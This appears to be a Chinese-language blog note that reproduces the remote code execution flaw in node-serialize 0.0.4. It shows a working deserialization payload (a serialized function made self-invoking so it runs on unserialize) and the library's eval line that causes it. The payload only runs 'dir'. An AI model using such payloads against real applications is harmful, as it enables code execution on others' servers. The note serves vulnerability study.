---
title: Node.js 反序列化远程代码执行
toc: true
categories:
  - web
date: 2025-05-25 21:00:00
tags:
  - Nodejs

---

# Node.js 反序列化远程代码执行

nodejs代码执行

```
const child = require("child_process");

child.exec('dir',function(error, stdout, stderr) { console.log(stdout) })
```

"node-serialize": "0.0.4"复现



```
const serialize = require('node-serialize');
const y = {
  rce : function(){
  require('child_process').exec('dir', function(error, stdout, stderr) { console.log(stdout) });
  }
 }
 console.log(serialize.serialize(y))

输出
{"rce":"_$$ND_FUNC$$_function(){\r\n  require('child_process').exec('dir', function(error, stdout, stderr) { console.log(stdout) });\r\n  }"}
```

给函数加个()

反序列化就执行了

```
const serialize = require('node-serialize');
a=`{"rce":"_$$ND_FUNC$$_function(){ require('child_process').exec('dir', function(error, stdout, stderr) { console.log(stdout) });  }()"}`
serialize.unserialize(a)
```



来看反序列化函数

```
exports.unserialize = function(obj, originObj) {
  var isIndex;
  if (typeof obj === 'string') {
    obj = JSON.parse(obj);
    isIndex = true;
  }
  originObj = originObj || obj;

  var circularTasks = [];
  var key;
  for(key in obj) {
    if(obj.hasOwnProperty(key)) {
      if(typeof obj[key] === 'object') {
        obj[key] = exports.unserialize(obj[key], originObj);
      } else if(typeof obj[key] === 'string') {
        if(obj[key].indexOf(FUNCFLAG) === 0) {
          obj[key] = eval('(' + obj[key].substring(FUNCFLAG.length) + ')');
        } else if(obj[key].indexOf(CIRCULARFLAG) === 0) {
          obj[key] = obj[key].substring(CIRCULARFLAG.length);
          circularTasks.push({obj: obj, key: key});
        }
      }
    }
  }
```

```
 obj[key] = eval('(' + obj[key].substring(FUNCFLAG.length) + ')');
```

这里key直接赋值eval的结果了

obj[key].substring(FUNCFLAG.length)就是json里key的值，函数就执行了

